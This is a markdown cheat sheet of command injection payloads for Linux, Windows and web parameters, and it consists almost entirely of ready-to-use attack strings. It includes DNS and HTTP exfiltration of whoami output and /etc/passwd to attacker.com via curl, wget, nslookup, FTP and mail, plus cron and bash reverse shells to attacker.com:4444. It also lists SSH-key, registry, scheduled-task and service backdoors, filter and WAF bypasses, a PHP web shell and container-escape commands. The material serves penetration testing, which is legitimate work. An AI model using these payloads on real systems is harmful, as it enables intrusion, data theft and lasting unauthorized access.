# Command Injection Payloads

## Overview
This document provides a comprehensive collection of command injection payloads for testing Remote Code Execution (RCE) vulnerabilities. Command injection occurs when untrusted user input is passed to a system shell for execution without proper validation or sanitization.

## Basic Command Injection Payloads

### Linux/Unix Systems

#### Command Separators
```bash
# Semicolon separator
; id
; whoami
; pwd
; ls -la

# Pipe operator
| id
| whoami
| pwd
| ls -la

# AND operator
&& id
&& whoami
&& pwd
&& ls -la

# OR operator
|| id
|| whoami
|| pwd
|| ls -la

# Background execution
& id
& whoami
& pwd
& ls -la
```

#### Command Substitution
```bash
# Backticks
`id`
`whoami`
`pwd`
`ls -la`

# Dollar parentheses
$(id)
$(whoami)
$(pwd)
$(ls -la)
```

#### Newline Injection
```bash
%0a id
%0d%0a id
\n id
\r\n id
```

### Windows Systems

#### Command Separators
```cmd
# Ampersand separator
& dir
& whoami
& hostname
& ipconfig

# Pipe operator
| dir
| whoami
| hostname
| ipconfig

# AND operator
&& dir
&& whoami
&& hostname
&& ipconfig

# OR operator
|| dir
|| whoami
|| hostname
|| ipconfig
```

#### PowerShell Injection
```powershell
# PowerShell execution
; powershell -c "Get-Process"
; powershell -c "whoami"
; powershell -c "Get-Location"
; powershell -c "Get-ChildItem"

# PowerShell encoded commands
; powershell -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==
```

## Advanced Payloads

### Time-Based Detection
```bash
# Linux sleep
; sleep 10
| sleep 10
&& sleep 10
|| sleep 10

# Windows timeout
& timeout /t 10
&& timeout /t 10
|| timeout /t 10

# Cross-platform ping delay
; ping -c 10 127.0.0.1
& ping -n 10 127.0.0.1
```

### Blind Command Injection
```bash
# DNS exfiltration (Linux)
; nslookup $(whoami).attacker.com
; dig $(id | base64).attacker.com

# HTTP exfiltration
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id | base64)

# Windows DNS exfiltration
& nslookup %USERNAME%.attacker.com
& ping %COMPUTERNAME%.attacker.com
```

### File Operations
```bash
# Linux file operations
; cat /etc/passwd
; ls -la /
; find / -name "*.conf" 2>/dev/null
; ps aux

# Windows file operations
& type C:\Windows\System32\drivers\etc\hosts
& dir C:\
& tasklist
& net user
```

## Bypass Techniques

### Space Filtering Bypasses
```bash
# Using tabs
;\tid

# Using ${IFS}
;cat${IFS}/etc/passwd
;ls${IFS}-la

# Using $'	'
;cat$'	'/etc/passwd

# Using braces
{cat,/etc/passwd}
```

### Keyword Filtering Bypasses
```bash
# Variable substitution
CMD=id;$CMD
A=i;B=d;$A$B

# Character encoding
\x69\x64  # id in hex
\151\144  # id in octal

# Base64 encoding
$(echo aWQ= | base64 -d)  # id

# Concatenation
'i''d'
"i""d"
id\\
```

### Quote and Escape Bypasses
```bash
# Single quotes
'; id #
'; id; '

# Double quotes
"; id #
"; id; "

# Backtick escape
`; id #`

# Comment injection
'; id #
'; id --
'; id /*
```

## Context-Specific Payloads

### Parameter Injection
```bash
# When injecting into command parameters
-i; id
--help; id
-v; id

# File path injection
../../../etc/passwd; id
..\..\..\windows\system32\drivers\etc\hosts; id
```

### Function Call Injection
```bash
# PHP system functions
); system('id');//
); exec('whoami');//
); shell_exec('pwd');//
); passthru('ls -la');//

# Python os functions
'); os.system('id')#
'); os.popen('whoami').read()#
```

## WAF and Filter Evasion

### Character Substitution
```bash
# Using wildcards
/b?n/sh
/b*n/sh

# Using character classes
/[b]in/sh
/bin/[s]h

# Using environment variables
$PATH/../../bin/sh
$HOME/../bin/sh
```

### Encoding Techniques
```bash
# URL encoding
%3B%20id
%7C%20whoami
%26%26%20pwd

# Unicode encoding
\u003B id
\u007C whoami

# HTML entity encoding
&#59; id
&#124; whoami
```

## Data Exfiltration Payloads

### Network-Based Exfiltration
```bash
# HTTP POST exfiltration
; curl -X POST -d "data=$(cat /etc/passwd | base64)" http://attacker.com/collect

# FTP exfiltration
; curl -T /etc/passwd ftp://attacker.com/

# Email exfiltration
; cat /etc/passwd | mail -s "Data" attacker@evil.com

# SMB exfiltration (Windows)
& copy C:\sensitive\data.txt \\attacker.com\share\
```

### File-Based Exfiltration
```bash
# Write to accessible web directory
; cat /etc/passwd > /var/www/html/passwd.txt
; cp /etc/passwd /tmp/public/

# Windows file copy
& copy C:\Windows\System32\drivers\etc\hosts C:\inetpub\wwwroot\hosts.txt
```

## Persistence Payloads

### Linux Persistence
```bash
# Crontab injection
; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# SSH key injection
; echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Service persistence
; echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh; /tmp/backdoor.sh
```

### Windows Persistence
```cmd
# Registry autorun
& reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\backdoor.exe" /f

# Scheduled task
& schtasks /create /tn "SystemUpdate" /tr "C:\backdoor.exe" /sc minute /mo 5

# Service creation
& sc create BackdoorService binPath= "C:\backdoor.exe" start= auto
& net start BackdoorService
```

## Common Injection Contexts

### Web Application Parameters
```bash
# GET parameters
http://target.com/app?cmd=ping; id
http://target.com/app?file=test.txt; cat /etc/passwd

# POST data
cmd=ping; whoami
filename=test.txt; ls -la

# Headers
User-Agent: Mozilla/5.0; id
X-Forwarded-For: 127.0.0.1; whoami
```

### File Upload Scenarios
```bash
# Filename injection
test.txt; id
file.jpg; whoami
../../../tmp/shell.php; id

# Content injection (if processed)
<?php system($_GET['cmd']); ?>
#!/bin/bash\nid
```

## Testing Methodology

### Detection Phase
```bash
# Basic detection
; echo "vulnerable"
| echo "vulnerable" 
&& echo "vulnerable"

# Time-based detection
; sleep 5
& timeout /t 5

# Error-based detection
; invalid_command_xyz_123
| non_existent_binary
```

### Exploitation Phase
```bash
# Information gathering
; uname -a
; cat /proc/version
; whoami
; id
; pwd
; env

# Network discovery
; ifconfig
; netstat -an
; ss -tuln
; arp -a

# System reconnaissance
; ps aux
; top
; df -h
; mount
; lsmod
```

## Mitigation Testing

### Input Validation Bypass
```bash
# Length restriction bypass
;id  # Minimal payload
;`id` # Alternative syntax

# Character restriction bypass
$(tr a-z A-Z <<<id)  # Case transformation
${PATH:0:1}bin${PATH:0:1}sh  # Path manipulation
```

### Sandboxing Bypass
```bash
# Chroot escape attempts
; cd ..; cd ..; cd ..; cd ..; ls
; python -c "import os; os.chroot('/tmp'); os.system('id')"

# Container escape
; docker run -v /:/host alpine chroot /host id
; kubectl exec -it pod -- /bin/sh
```

## Payload Encoding Reference

### URL Encoding Table
```
;  -> %3B
|  -> %7C
&  -> %26
#  -> %23
?  -> %3F
=  -> %3D
+  -> %2B
   -> %20 (space)
\n -> %0A (newline)
\r -> %0D (carriage return)
```

### Base64 Common Commands
```bash
id -> aWQ=
whoami -> d2hvYW1p
pwd -> cHdk
ls -> bHM=
cat -> Y2F0
echo -> ZWNobw==
```

## Notes
- Always test in authorized environments only
- Some payloads may cause system instability
- Adjust payloads based on target operating system
- Consider network restrictions and egress filtering
- Use appropriate encoding for the injection context
- Test incrementally from basic to advanced payloads

## References
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [SANS Command Injection Guide](https://www.sans.org/white-papers/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/os-command-injection)
